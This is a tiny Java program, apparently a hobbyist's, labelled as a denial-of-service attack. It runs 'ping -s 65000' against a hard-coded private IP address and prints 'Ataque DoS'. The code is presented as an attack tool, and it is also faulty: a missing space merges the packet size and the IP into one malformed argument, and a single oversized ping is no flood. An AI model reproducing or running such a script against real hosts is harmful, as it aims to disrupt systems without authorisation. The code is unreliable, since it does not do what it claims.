package java;
import java.io.IOException;

public class DoS {

	public static void main(String[] args) {
		String targetIp = "192.168.15.24";
		String command = "ping -s 65000" + targetIp;
		try {
			Process process = Runtime.getRuntime().exec(command);
			System.out.println("Ataque DoS -> " + targetIp);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
